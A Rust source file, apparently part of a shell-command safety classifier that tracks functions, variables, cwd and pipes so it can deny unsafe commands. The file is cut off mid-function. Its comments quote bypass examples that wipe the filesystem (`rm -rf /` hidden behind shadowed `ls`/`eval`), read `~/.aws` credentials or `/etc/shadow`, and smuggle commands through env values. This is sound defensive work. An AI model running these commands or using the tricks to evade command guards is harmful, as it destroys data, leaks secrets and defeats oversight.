use super::*;
use crate::handlers;
use crate::parse::Token;
use crate::verdict::{SafetyLevel, Verdict};

thread_local! {
    /// Total (re-)classifications spent on one top-level `command_verdict`. Delegating handlers
    /// (`fd -x`, `find -exec`, `xargs`, `sudo`) re-enter here on the wrapped command, and a command
    /// that NESTS them — `fd a b -x fd c d -x …` — branches multiplicatively (one re-check per
    /// pre-exec base × per nesting level), i.e. exponentially. This monotonic counter caps the total
    /// so any such blow-up fails CLOSED (Denied) in bounded time instead of hanging the hook. A depth
    /// cap alone can't help: 3^depth calls explode long before any depth limit bites.
    static CLASSIFY_WORK: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    static CLASSIFY_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
}

/// Far above any real command's handful of delegations (a `&&` chain of 50 `fd -x`s spends ~100),
/// far below the exponential explosion. Found by the parse fuzzer (`fd -x fd -x …`). Kept modest so
/// the worst-case CUTOFF is also cheap in wall-clock terms — each unit is a full re-classification
/// (parse + dispatch), so a high ceiling would let a crafted command burn hundreds of ms in the hook
/// (and blow the debug-mode timing of `classifier_terminates_on_adversarial_input`).
const MAX_CLASSIFY_WORK: u32 = 512;

/// RAII budget guard for the classifier recursion. `enter` resets the budget at the OUTERMOST call
/// and charges one unit per (re-)entry; `None` means the budget is spent and the caller must fail
/// closed. Depth is bumped only on a successful enter, so it stays balanced with the `Drop`.
struct ClassifyGuard;

impl ClassifyGuard {
    fn enter() -> Option<Self> {
        if CLASSIFY_DEPTH.with(|d| d.get()) == 0 {
            CLASSIFY_WORK.with(|w| w.set(0));
        }
        let spent = CLASSIFY_WORK.with(|w| {
            let n = w.get().saturating_add(1);
            w.set(n);
            n
        });
        if spent > MAX_CLASSIFY_WORK {
            return None;
        }
        CLASSIFY_DEPTH.with(|d| d.set(d.get() + 1));
        Some(ClassifyGuard)
    }
}

impl Drop for ClassifyGuard {
    fn drop(&mut self) {
        CLASSIFY_DEPTH.with(|d| d.set(d.get().saturating_sub(1)));
    }
}

/// Charge `units` of extra work to the shared per-classification budget; `false` once it is spent
/// and the caller must fail closed.
///
/// Brace expansion charges here so its fan-out draws from the SAME pool as delegation and function
/// resolution. Otherwise the two caps MULTIPLY rather than add: a word may expand to
/// `BRACE_EXPANSION_CAP` (256) alternatives and each delegated re-classification re-expands it, so
/// 512 delegations × 256 words is ~131k word checks — seconds of wall clock from a ~200-byte input
/// (found by the nightly fuzzer as a timeout). Neither cap is unreasonable alone; only their product
/// is. Charging fan-out here makes the total additive and keeps the worst case bounded.
pub(crate) fn charge_classify_work(units: u32) -> bool {
    CLASSIFY_WORK.with(|w| {
        let n = w.get().saturating_add(units);
        w.set(n);
        n <= MAX_CLASSIFY_WORK
    })
}

pub fn command_verdict(input: &str) -> Verdict {
    let Some(_guard) = ClassifyGuard::enter() else {
        return Verdict::Denied; // classification budget spent — fail closed
    };
    let Some(script) = parse(input) else {
        return Verdict::Denied;
    };
    script_verdict(&script)
}

pub fn is_safe_command(input: &str) -> bool {
    command_verdict(input).is_allowed()
}

thread_local! {
    /// Functions DEFINED so far in the current classification, so a later call resolves to its body
    /// (and a definition SHADOWS a same-named built-in — `ls(){ rm -rf /; }; ls` runs rm). Owned
    /// clones (small); a thread-local can't borrow the CST. Latest definition wins.
    static FUNCTIONS: std::cell::RefCell<Vec<(String, Script)>> =
        const { std::cell::RefCell::new(Vec::new()) };
    /// Function names whose CURRENT body we cannot attribute — redefined inside a compound, where
    /// the shell keeps the new body but we cannot say which one ran. `lookup_function` reports them
    /// as unknown, so a call falls through to ordinary dispatch and denies (fail-closed) rather
    /// than resolving to a stale, more permissive definition.
    static POISONED_FUNCS: std::cell::RefCell<Vec<String>> =
        const { std::cell::RefCell::new(Vec::new()) };
    /// Names currently being resolved — bounds recursion (direct AND mutual) and total call depth,
    /// so `f(){ f; }` or a deep chain can't blow the stack; hitting the bound denies (fail-closed).
    static RESOLVING: std::cell::RefCell<Vec<String>> = const { std::cell::RefCell::new(Vec::new()) };
}

const MAX_FUNC_DEPTH: usize = 32;

/// The value a `$VAR`/`$1` binds to when the assigned/argument value is UNCERTAIN (a substitution,
/// an unbound var, a reassignment to same). It looks like a path AND is unpinnable, so `$VAR/x`
/// fail-closes in both gate layers rather than resolving to a stale or dropped value.
const UNCERTAIN_VALUE: &str = "/__SAFE_CHAINS_CMDSUB__";

struct FuncScope;
impl Drop for FuncScope {
    fn drop(&mut self) {
        FUNCTIONS.with(|f| {
            f.borrow_mut().pop();
        });
    }
}

fn define_function(name: String, body: Script) -> FuncScope {
    FUNCTIONS.with(|f| f.borrow_mut().push((name, body)));
    FuncScope
}

fn lookup_function(name: &str) -> Option<Script> {
    if POISONED_FUNCS.with(|p| p.borrow().iter().any(|n| n == name)) {
        return None; // body unknown — deny rather than use a stale one
    }
    FUNCTIONS.with(|f| f.borrow().iter().rev().find(|(n, _)| n == name).map(|(_, b)| b.clone()))
}

/// Mark `name`'s body unknown for the rest of this evaluation. Not scoped by a guard: the shell's
/// redefinition is not scoped either, and every classification starts with a fresh thread-local.
fn poison_function(name: String) {
    POISONED_FUNCS.with(|p| p.borrow_mut().push(name));
}

struct ResolveScope;
impl Drop for ResolveScope {
    fn drop(&mut self) {
        RESOLVING.with(|r| {
            r.borrow_mut().pop();
        });
    }
}

/// Begin resolving a call to `name`, unless it recurses, exceeds the depth cap, or exhausts the
/// per-invocation classification budget — then return `None` and the caller treats it as an ordinary
/// (unknown) command, which denies. The budget is what stops exponential FAN-OUT (`f(){ f2; f2; };
/// f2(){ f3; f3; }; …`): the depth cap alone bounds a linear chain, but branching multiplies, so each
/// resolution charges the shared `CLASSIFY_WORK` counter that also caps delegating-handler recursion.
fn begin_resolving(name: &str) -> Option<ResolveScope> {
    let over_budget = CLASSIFY_WORK.with(|w| {
        let n = w.get().saturating_add(1);
        w.set(n);
        n > MAX_CLASSIFY_WORK
    });
    if over_budget {
        return None;
    }
    RESOLVING.with(|r| {
        let mut stack = r.borrow_mut();
        if stack.len() >= MAX_FUNC_DEPTH || stack.iter().any(|n| n == name) {
            None
        } else {
            stack.push(name.to_string());
            Some(ResolveScope)
        }
    })
}

fn script_verdict(script: &Script) -> Verdict {
    walk_with_scope(script, |stmt| pipeline_verdict(&stmt.pipeline))
        .into_iter()
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

/// Walk `script`'s statements IN ORDER, running `per_stmt` on each with the accumulated scope
/// installed, and return the per-statement results.
///
/// The scope is: the running `cwd` (HP-19 — a later relative path resolves against a prior `cd`),
/// plus `VAR=value` bindings and function definitions from EARLIER statements (bash semantics;
/// released when this returns). Fail-open on cwd: an unresolvable `cd` leaves it unchanged.
///
/// Shared by `script_verdict` AND the explainer so both see the SAME scope. This is load-bearing for
/// security: a definition that shadows a builtin (`ls(){ rm -rf /; }; ls`) must deny in BOTH — if the
/// per-segment explain classified the `ls` call without the definition in scope, the hook's coverage
/// fallback (which uses the explainer) would re-allow the very thing the whole-command verdict denied.
pub(crate) fn walk_with_scope<T>(script: &Script, mut per_stmt: impl FnMut(&Stmt) -> T) -> Vec<T> {
    let mut running = crate::pathctx::cwd();
    let mut _vars: Vec<crate::pathctx::VarGuard> = Vec::new();
    let mut _funcs: Vec<FuncScope> = Vec::new();
    let mut out = Vec::with_capacity(script.0.len());
    for stmt in &script.0 {
        out.push({
            let _cwd = crate::pathctx::enter_cwd(running.clone());
            per_stmt(stmt)
        });
        let effects = shell_effects(&stmt.pipeline);
        let next = cd_target(&stmt.pipeline).and_then(|t| crate::pathctx::join_cwd(running.as_deref(), &t));
        if next.is_some() {
            running = next;
        } else if effects.cwd {
            // The shell may have moved somewhere we cannot name — a `cd` inside a compound or a
            // called function, or a bare `cd`/`cd -`. Keeping the old cwd would judge later
            // relative paths against a directory the shell has left.
            running = Some(crate::pathctx::UNRESOLVED_CWD.to_string());
        }
        for (name, value) in statement_assignments(&stmt.pipeline) {
            _vars.push(crate::pathctx::enter_var(name, value));
        }
        // Rebinds the shell keeps but we cannot attribute — a `VAR=…` or `name() {…}` inside a
        // compound or a called function. Pushed AFTER the precise bindings above so the uncertain
        // value wins for that name; a statement handled precisely contributes nothing here.
        for name in effects.vars {
            _vars.push(crate::pathctx::enter_var(name, UNCERTAIN_VALUE.to_string()));
        }
        for name in effects.funcs {
            poison_function(name);
        }
        if let [Cmd::FunctionDef { name, body }] = stmt.pipeline.commands.as_slice() {
            _funcs.push(define_function(name.clone(), body.clone()));
        }
    }
    out
}

/// How deep to chase function bodies. Bounded so a recursive definition cannot spin; hitting the
/// bound reports a possible effect, which fails closed.
const MAX_CD_SCAN_DEPTH: usize = 16;

/// What running a statement may do to the CURRENT shell's state that we cannot attribute exactly.
///
/// bash isolates such effects in exactly two places — a SUBSHELL, and a stage of a multi-command
/// pipeline. Everywhere else (brace group, `if`, `for`, `while`, `case`, a called function) a `cd`,
/// a `VAR=…` or a `name() {…}` takes effect in the current shell and outlives the construct. The
/// precise handling matches only statement-level forms, so all of those escaped tracking:
/// `{ cd ~/.aws; }; cat credentials` was judged as a worktree read, and
/// `VAR=./ok; { VAR=/etc/shadow; }; cat $VAR` kept the stale binding. Both are fail-OPEN — the
/// stale state is the permissive one.
///
/// Whether the effect happened is unknowable (a branch may not be taken, a loop may not run), so
/// the caller marks the cwd and the named bindings UNCERTAIN rather than guessing a value.
#[derive(Default)]
struct ShellEffects {
    cwd: bool,
    vars: Vec<String>,
    funcs: Vec<String>,
}

/// The effects of one statement. Empty for a multi-stage pipeline, whose stages are subshells.
fn shell_effects(pipeline: &Pipeline) -> ShellEffects {
    let mut out = ShellEffects::default();
    if let [only] = pipeline.commands.as_slice() {
        // `seen` memoizes function bodies. Without it `f0(){ f1; f1; }; f1(){ f2; f2; }; …` costs
        // 2^depth traversals — a depth cap bounds depth but not FAN-OUT, the same blow-up the
        // classifier's own work budget exists for. Caught by the termination guard.
        let mut seen = Vec::new();
        scan_effects(only, MAX_CD_SCAN_DEPTH, &mut seen, &mut out);
    }
    out
}

fn scan_effects(cmd: &Cmd, depth: usize, seen: &mut Vec<String>, out: &mut ShellEffects) {
    let Some(depth) = depth.checked_sub(1) else {
        out.cwd = true; // out of budget — assume the worst
        return;
    };
    match cmd {
        Cmd::Simple(s) => {
            let Some(name) = s.words.first().map(Word::eval) else {
                return; // a bare `VAR=x` — handled precisely by `statement_assignments`
            };
            if name == "cd" {
                out.cwd = true;
                return;
            }
            // A CALL runs the body in THIS shell, so its effects escape with it.
            if seen.contains(&name) {
                return;
            }
            if let Some(body) = lookup_function(&name) {
                seen.push(name);
                scan_script_effects(&body, depth, seen, out);
            }
        }
        // The two constructs the shell really does isolate, plus forms that run nothing.
        Cmd::Subshell { .. } | Cmd::DoubleBracket { .. } | Cmd::FunctionDef { .. } => {}
        Cmd::BraceGroup { body, .. } | Cmd::For { body, .. } => {
            scan_script_effects(body, depth, seen, out);
        }
        Cmd::While { cond, body, .. } | Cmd::Until { cond, body, .. } => {
            scan_script_effects(cond, depth, seen, out);
            scan_script_effects(body, depth, seen, out);
        }
        Cmd::If { branches, else_body, .. } => {
            for b in branches {
                scan_script_effects(&b.cond, depth, seen, out);
                scan_script_effects(&b.body, depth, seen, out);
            }
            if let Some(e) = else_body {
                scan_script_effects(e, depth, seen, out);
            }
        }
        Cmd::Case { arms, .. } => {
            for a in arms {
                scan_script_effects(&a.body, depth, seen, out);
            }
        }
    }
}

/// Every statement of a body that the shell would run in the current shell: its assignments and
/// function definitions rebind here, and its commands are scanned in turn.
fn scan_script_effects(script: &Script, depth: usize, seen: &mut Vec<String>, out: &mut ShellEffects) {
    for st in &script.0 {
        for (name, _) in statement_assignments(&st.pipeline) {
            out.vars.push(name);
        }
        if let [Cmd::FunctionDef { name, .. }] = st.pipeline.commands.as_slice() {
            out.funcs.push(name.clone());
        }
        if let [only] = st.pipeline.commands.as_slice() {
            scan_effects(only, depth, seen, out);
        }
    }
}

/// The target of a statement-level `cd DIR` (a single simple command named `cd`), for cwd
/// tracking. `None` for anything else, or `cd` with no plain positional (bare `cd`, `cd -`).
fn cd_target(pipeline: &Pipeline) -> Option<String> {
    let [Cmd::Simple(s)] = pipeline.commands.as_slice() else {
        return None;
    };
    if s.words.first()?.eval() != "cd" {
        return None;
    }
    s.words.iter().skip(1).map(|w| w.eval()).find(|a| !a.starts_with('-'))
}

/// The variables a `while`/`until` condition of the form `read VAR…` (incl. `IFS= read -r VAR`) binds
/// from stdin — its non-flag positionals — so the body's `$VAR` can be gated at the pipe's item locus.
/// Empty for any other condition. (An exotic valued read flag's value may be over-included as a var
/// name; harmless — it just binds a never-referenced name to the same workspace locus.)
fn read_loop_vars(cond: &Script) -> Vec<String> {
    let [stmt] = cond.0.as_slice() else {
        return Vec::new();
    };
    let [Cmd::Simple(s)] = stmt.pipeline.commands.as_slice() else {
        return Vec::new();
    };
    let words: Vec<String> = s.words.iter().map(Word::eval).collect();
    if words.first().map(String::as_str) != Some("read") {
        return Vec::new();
    }
    words[1..].iter().filter(|w| !w.starts_with('-')).cloned().collect()
}

/// The persistent bindings a STATEMENT establishes: a pure assignment `VAR=value` (a simple command
/// with env and NO words). A prefix `VAR=x cmd` is excluded — per bash it doesn't persist and
/// doesn't even affect `$VAR` in `cmd`'s own args. Each value is resolved against the bindings so far
/// (so `B=$A/x` chains); a CERTAIN literal binds verbatim, an uncertain one binds the sentinel.
fn statement_assignments(pipeline: &Pipeline) -> Vec<(String, String)> {
    let [Cmd::Simple(s)] = pipeline.commands.as_slice() else {
        return Vec::new();
    };
    if !s.words.is_empty() {
        return Vec::new();
    }
    s.env.iter().map(|(name, value)| (name.clone(), certain_value(value))).collect()
}

/// A word's CERTAIN literal value for binding, or the unpinnable sentinel when uncertain. Resolves
/// `$refs` against the current scope first, then requires no residual `$` and no substitution
/// sentinel — a substitution (`$(…)`), an unbound var, or a reassignment-to-uncertain all fail here.
fn certain_value(word: &Word) -> String {
    let raw = crate::pathctx::expand_vars(&word.eval(), false).into_owned();
    // A TAGGED substitution sentinel is certain enough to BIND: it already classifies to a known
    // locus, so `OUT=$(pwd); … > "$OUT/raw/x"` gates the write at the worktree rather than
    // fail-closing on a value it can in fact bound. Every other marker stays uncertain.
    if raw.contains('$') || is_opaque_value(&raw) {
        UNCERTAIN_VALUE.to_string()
    } else {
        raw
    }
}

/// Whether an evaluated word carries a marker the classifier CANNOT bound: the opaque command
/// substitution, a process substitution (a `/dev/fd` pipe), or arithmetic. Deliberately not a
/// `__SAFE_CHAINS_` prefix test, which would also catch the tagged (bounded) substitution.
pub(crate) fn is_opaque_value(raw: &str) -> bool {
    ["__SAFE_CHAINS_CMDSUB__", "__SAFE_CHAINS_PROCSUB__", "__SAFE_CHAINS_ARITH__"]
        .iter()
        .any(|m| raw.contains(m))
}

#[cfg(test)]
pub(crate) fn is_safe_script(script: &Script) -> bool {
    script_verdict(script).is_allowed()
}

pub(crate) fn pipeline_verdict(pipeline: &Pipeline) -> Verdict {
    let mut acc = Verdict::Allowed(SafetyLevel::Inert);
    // The representative path-locus of the CURRENT stream (the previous stage's stdout), threaded so
    // a line-preserving filter carries the producer's locus THROUGH it: in `find ./src | head | xargs
    // cat`, `head`'s output items are still `find`'s worktree paths, so `xargs` gates them there
    // instead of worst-casing. In `A | xargs CMD`, xargs injects A's items as CMD's operands (the
    // same idea as `find -exec`'s `{}` binding, sourced from the pipe).
    let mut stream: Option<String> = None;
    for cmd in &pipeline.commands {
        let _stdin = stream.clone().map(crate::pathctx::enter_stdin_repr);
        acc = acc.combine(cmd_verdict(cmd));
        stream = Some(stage_output_repr(cmd, stream.as_deref()));
    }
    acc
}

/// The sentinel operand fed to an injecting consumer when the source is unknown/unmodeled. The
/// leading `/` makes it LOOK like a path (so `pathgate`-gated readers like `od` gate it) and the
/// cmdsub marker makes it unpinnable (so engine-resolved readers like `cat` worst-case it) — it
/// must deny in BOTH gate layers.
const UNKNOWN_ITEM: &str = "/__SAFE_CHAINS_CMDSUB__";

/// A representative PATH for the items `cmd` emits on stdout given the stream repr it RECEIVED
/// (`input`), used to gate an operand-injecting consumer downstream (`… | xargs cat`). A PRODUCER
/// that provably emits workspace-bounded paths yields a worktree representative; a line-preserving
/// FILTER carries `input` through unchanged; everything else worst-cases to `UNKNOWN_ITEM`.
fn stage_output_repr(cmd: &Cmd, input: Option<&str>) -> String {
    let Cmd::Simple(s) = cmd else {
        return UNKNOWN_ITEM.to_string();
    };
    let words: Vec<String> = s.words.iter().map(Word::eval).collect();
    let Some(first) = words.first() else {
        return UNKNOWN_ITEM.to_string();
    };
    let name = Token::from_raw(first.clone()).command_name().to_string();
    let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
    let through = || input.unwrap_or(UNKNOWN_ITEM).to_string();
    match name.as_str() {
        // find/fd emit paths UNDER their roots — the child of the worst root carries its locus.
        //
        // "Worst" by BOTH faces, not by whether the read is allowed. Selecting on `source_ok`
        // dropped any root that merely reads fine, so `find app/.git` fell through to `.` and
        // `find app/.git | while read f; do echo hi > "$f"; done` wrote into the frozen rung that
        // `echo hi > app/.git/config` refuses. `.git` is exactly the path that reads fine and must
        // not be written, so a read-face test could never see it.
        "find" | "fd" | "fdfind" => {
            let roots = find_roots(&args);
            let base = roots
                .iter()
                .max_by_key(|r| {
                    let (read, write) = (
                        crate::engine::resolve::locus::read_locus(r),
                        crate::engine::resolve::locus::write_locus(r),
                    );
                    read.max(write)
                })
                .copied()
                .unwrap_or(".");
            format!("{}/sc_item", base.trim_end_matches('/'))
        }
        // ls emits cwd-relative BASENAMES (worktree) unless `-d` echoes its (possibly absolute) args.
        "ls" => {
            if args.contains(&"-d") {
                worst_arg_repr(&args)
            } else {
                "sc_item".to_string()
            }
        }
        // echo/printf emit their args verbatim; the worst-locus arg is the representative.
        "echo" | "printf" => worst_arg_repr(&args),
        // git path-listers emit repo-relative paths (worktree, assuming the repo is the workspace).
        "git" => match args.first() {
            Some(&"ls-files") | Some(&"diff") | Some(&"status") | Some(&"grep") => "sc_item".to_string(),
            _ => UNKNOWN_ITEM.to_string(),
        },
        // Line-preserving FILTERS: each output line is a WHOLE, unchanged input line, so the stream's
        // item locus is unchanged — carry `input` through. Only when reading stdin (no file operand)
        // and not byte-slicing (`head -c`, which can split a path); NOT `grep -o`/`sed`/`awk`/`cut`/`tr`
        // (they can rewrite a line to ANY path — treating those as passthrough would be a bypass).
        "sort" | "uniq" | "cat" | "tac" if !reads_a_file(&args) => through(),
        "head" | "tail"
            if !reads_a_file_after_count(&args)
                && !args.iter().any(|a| *a == "-c" || a.starts_with("--bytes")) =>
        {
            through()
        }
        // tee always forwards stdin→stdout (its file args are extra WRITES, gated elsewhere).
        "tee" => through(),
        _ => UNKNOWN_ITEM.to_string(),
    }
}

/// Whether a filter reads a FILE rather than stdin (so it is NOT a stdin passthrough): a
/// positional operand, or `sort`'s `--files0-from=F` / `--files0-from F`, which redirects it to
/// emit the CONTENTS of the files listed in `F` — arbitrary file-derived output, not the piped
/// stream. A lone `-` (explicit stdin) doesn't count. The `=`-glued flag form is a single token
/// starting with `-`, so it must be matched explicitly or it would masquerade as a passthrough.
fn reads_a_file(args: &[&str]) -> bool {
    args.iter().any(|a| {
        (!a.starts_with('-') && *a != "-")
            || *a == "--files0-from"
            || a.starts_with("--files0-from=")
    })
}

/// Like `reads_a_file`, but skips the VALUE of `head`/`tail`'s count flags (`-n N`, `-c N`) so
/// `head -n 5` (stdin) isn't mistaken for reading a file named `5`.
fn reads_a_file_after_count(args: &[&str]) -> bool {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if matches!(a, "-n" | "-c" | "--lines" | "--bytes") {
            i += 2; // flag + its value
            continue;
        }
        if a.starts_with('-') || a == "-" {
            i += 1;
            continue;
        }
        return true; // a bare positional → a file operand
    }
    false
}

/// Whether reading `path` is admitted — i.e. it is a workspace-bounded source (worktree, `/tmp`,
/// a granted dir), so paths derived from it are safe operands.
fn source_ok(path: &str) -> bool {
    crate::engine::resolve::read_content_verdict(path).is_allowed()
}

/// The worst-locus non-flag arg (for `echo`/`printf`, which emit args verbatim): the first arg
/// whose read is denied, else a worktree placeholder.
fn worst_arg_repr(args: &[&str]) -> String {
    args.iter()
        .filter(|a| !a.starts_with('-'))
        .find(|a| !source_ok(a))
        .map_or_else(|| "sc_item".to_string(), |a| (*a).to_string())
}

/// `find`'s root operands: after any leading global options (`-H`/`-L`/`-P`, `-D`/`-O V`), the
/// positional args up to the first predicate (`-name`, `(`, `!`, …). Defaults to `.` (cwd).
fn find_roots<'a>(args: &[&'a str]) -> Vec<&'a str> {
    let mut i = 0;
    while i < args.len() {
        match args[i] {
            "-H" | "-L" | "-P" => i += 1,
            "-D" | "-O" => i += 2,
            _ => break,
        }
    }
    let mut roots = Vec::new();
    while i < args.len() && !args[i].starts_with('-') && !matches!(args[i], "(" | "!" | ")" | ",") {
        roots.push(args[i]);
        i += 1;
    }
    if roots.is_empty() {
        roots.push(".");
    }
    roots
}

pub fn is_safe_pipeline(pipeline: &Pipeline) -> bool {
    pipeline_verdict(pipeline).is_allowed()
}

pub(crate) fn has_unsafe_syntax(cmd: &Cmd) -> bool {
    match cmd {
        Cmd::Simple(s) => !check_redirects(&s.redirs) || has_any_substitution(s),
        _ => true,
    }
}

fn has_any_substitution(cmd: &SimpleCmd) -> bool {
    cmd.words.iter().any(has_substitution)
        || cmd.env.iter().any(|(_, v)| has_substitution(v))
}

/// A command rendered for comparison against the user's own `Bash(...)` allow-rules.
///
/// Includes the LEADING ENV ASSIGNMENTS. Dropping them meant a rule written for one command
/// silently covered a different one: `Bash(~/runner-scripts/x.sh:*)` matched
/// `WRITE=1 ~/runner-scripts/x.sh`, so a rule intended for a dry run pre-approved the mutating run.
/// The user had even written separate `Bash(WRITE=1 …)` entries — necessary at the harness's own
/// matcher, and quietly redundant here.
///
/// The rule must describe the command as TYPED. That is not a judgement about which variable names
/// are dangerous (nothing here knows `LD_PRELOAD` from `NODE_ENV`) — it is only the requirement that
/// an allow-rule cover what it claims to. A command carrying an assignment therefore matches only a
/// rule that carries it too, and otherwise falls through to the harness's normal approval flow.
///
/// This is the USER-ALLOWLIST path alone. safe-chains' own knowledge of a command is consulted
/// first and short-circuits before reaching here, so `LD_PRELOAD=… ls` is unaffected — see
/// `docs/design/env-prefix-classification.md` for that separate, unfixed hole.
/// `None` when the command cannot be rendered UNAMBIGUOUSLY, which callers must treat as "matches
/// nothing".
///
/// An env value containing whitespace has no unambiguous flat rendering: `WRITE='1 script.sh' rm
/// -rf /` and `WRITE=1 script.sh rm -rf /` produce the same string, but the first runs `rm` and the
/// second runs `script.sh`. Since assignments sit BEFORE the program name, a value that swallows
/// the rest of a pattern lets a rule for one program match a different one —
/// `Bash(WRITE=1 script.sh:*)` would match `WRITE='1 script.sh' rm -rf /`. Refusing to render is the
/// only honest answer; the alternative is a rule that silently covers a program it never named.
///
/// Words with whitespace are NOT refused: `git commit -m 'a message'` is ordinary and a rule like
/// `Bash(git commit -m:*)` should keep covering it. A quoted word can shift an argument boundary,
/// which is a pre-existing looseness of this matcher, but it cannot change which program runs —
/// the program is the first word either way.
pub(crate) fn normalize_for_matching(cmd: &SimpleCmd) -> Option<String> {
    let mut parts = Vec::with_capacity(cmd.env.len() + cmd.words.len());
    for (name, value) in &cmd.env {
        let value = value.eval();
        if value.chars().any(char::is_whitespace) {
            return None;
        }
        parts.push(format!("{name}={value}"));
    }
    parts.extend(cmd.words.iter().map(|w| w.eval()));
    Some(parts.join(" "))
}

pub(crate) fn cmd_verdict(cmd: &Cmd) -> Verdict {
    match cmd {
        Cmd::Simple(s) => simple_verdict(s),
        Cmd::Subshell { body, redirs } | Cmd::BraceGroup { body, redirs } => {
            let body_v = script_verdict(body);
            if let Verdict::Denied = body_v {
                return Verdict::Denied;
            }
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            body_v.combine(redir_v)
        }
        Cmd::For { var, items, body, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            // Bind `$var` in the body to the loop list's locus (the `find … {}`→path binding,
            // one layer up), so `for f in *.txt; do cat $f` reads the worktree instead of
            // fail-closing on the bare `$f`.
            let item_strs: Vec<String> = items.iter().map(Word::eval).collect();
            let body_v = match crate::engine::resolve::loop_reprs(&item_strs) {
                Some((read_repr, write_repr)) => {
                    let _g = crate::pathctx::enter_loop_var(var.clone(), read_repr, write_repr);
                    script_verdict(body)
                }
                None => script_verdict(body),
            };
            words_sub_verdict(items).combine(body_v).combine(redir_v)
        }
        Cmd::While { cond, body, redirs } | Cmd::Until { cond, body, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let cond_v = script_verdict(cond);
            // `while read VAR; do … "$VAR" …` — bind each read var to the piped stdin's item locus,
            // exactly as the `for`-loop binds its list var, so `find ./src | while read f; do cat "$f"`
            // reads the worktree instead of fail-closing on the bare `$f`. Only when a modeled source
            // set the stdin repr; otherwise the vars stay unbound (fail-closed).
            let _binds: Vec<crate::pathctx::LoopGuard> = match crate::pathctx::stdin_item_repr() {
                Some(repr) => read_loop_vars(cond)
                    .into_iter()
                    .map(|v| crate::pathctx::enter_loop_var(v, repr.clone(), repr.clone()))
                    .collect(),
                None => Vec::new(),
            };
            cond_v.combine(script_verdict(body)).combine(redir_v)
        }
        Cmd::If {
            branches,
            else_body,
            redirs,
        } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let mut v = redir_v;
            for b in branches {
                v = v.combine(script_verdict(&b.cond)).combine(script_verdict(&b.body));
            }
            if let Some(eb) = else_body {
                v = v.combine(script_verdict(eb));
            }
            v
        }
        Cmd::DoubleBracket { words, redirs } => {
            words_sub_verdict(words).combine(redirect_verdict(redirs))
        }
        // Which arm runs is decided at runtime, so — exactly as for `If` — every arm body counts
        // and the case is only as safe as its worst arm. The patterns are matched, never executed,
        // but the SUBJECT is expanded, so its substitutions are gated like any other word.
        Cmd::Case { subject, arms, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let mut v = redir_v.combine(word_sub_verdict(subject));
            for arm in arms {
                v = v.combine(words_sub_verdict(&arm.patterns)).combine(script_verdict(&arm.body));
            }
            v
        }
        // Defining a function has NO effect — Inert regardless of the body. The body's safety is
        // evaluated only when the function is CALLED (resolved in `simple_verdict`), so an UNCALLED
        // definition never denies on its body.
        Cmd::FunctionDef { .. } => Verdict::Allowed(SafetyLevel::Inert),
    }
}

pub(crate) fn is_safe_cmd(cmd: &Cmd) -> bool {
    cmd_verdict(cmd).is_allowed()
}

fn part_sub_verdict(part: &WordPart) -> Verdict {
    match part {
        WordPart::CmdSub(inner) | WordPart::ProcSub(inner) => script_verdict(inner),
        WordPart::Backtick(raw) => command_verdict(raw),
        WordPart::DQuote(inner) => word_sub_verdict(inner),
        // Arithmetic is inert, but a `$( )` inside it runs — judged, not skipped.
        WordPart::Arith(inner) => word_sub_verdict(inner),
        _ => Verdict::Allowed(SafetyLevel::Inert),
    }
}

fn word_sub_verdict(word: &Word) -> Verdict {
    word.0.iter()
        .map(part_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

fn words_sub_verdict(words: &[Word]) -> Verdict {
    words.iter()
        .map(word_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

#[cfg(test)]
pub(crate) fn word_subs_safe(word: &Word) -> bool {
    word_sub_verdict(word).is_allowed()
}

fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
    let redir_v = redirect_verdict(&cmd.redirs);
    if let Verdict::Denied = redir_v {
        return Verdict::Denied;
    }

    let env_sub_v = cmd.env.iter()
        .map(|(_, v)| word_sub_verdict(v))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine);
    let word_sub_v = words_sub_verdict(&cmd.words);

    // A LISTED assignment is classified by its value (`envvars.toml`): `GIT_SSH_COMMAND` carries a
    // command, `LD_PRELOAD` a path supplying code. An unlisted name is Inert, so this changes
    // nothing for ordinary invocations — `FOO=bar ls` classifies exactly as `ls` does.
    //
    // COMBINED, not merely checked for denial. An assignment that resolves to a LEVEL carries that
    // level into the command: `RUSTFLAGS='-Cincremental=./x'` authorises a worktree write, so the
    // invocation is a write even when the command word is inert. Propagating only `Denied` here
    // meant `RUSTFLAGS='-Cincremental=./x' echo hi` passed at `paranoid`, while the same write
    // spelled `touch ./x` did not.
    let env_name_v = cmd
        .env
        .iter()
        .map(|(name, value)| crate::envvars::assignment_verdict(name, &value.eval()))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine);
    let sub_v = env_sub_v.combine(word_sub_v).combine(env_name_v);

    if let Verdict::Denied = sub_v {
        return Verdict::Denied;
    }

    if cmd.words.is_empty() {
        if cmd.env.is_empty() {
            return Verdict::Allowed(SafetyLevel::Inert);
        }
        return sub_v.combine(redir_v);
    }

    let name = cmd.words[0].eval();

    // Function CALL: a user function SHADOWS everything it names, INCLUDING builtins like `eval`
    // (`eval(){ rm -rf /; }; eval "echo hi"` runs the function, not eval) — so resolve a defined name
    // FIRST, before the eval special-case and the leaf dispatch. Classify its BODY with $1..$N bound
    // to the call's args (certain literals; uncertain → unpinnable). The shadow is UNCONDITIONAL: if
    // resolution is blocked (recursion / depth / budget) we FAIL CLOSED, never fall through to the
    // real command — otherwise `…512 calls…; ls(){ rm -rf /; }; ls` would exhaust the budget and then
    // run the real `ls` for the rebound name, a bypass.
    if let Some(body) = lookup_function(&name) {
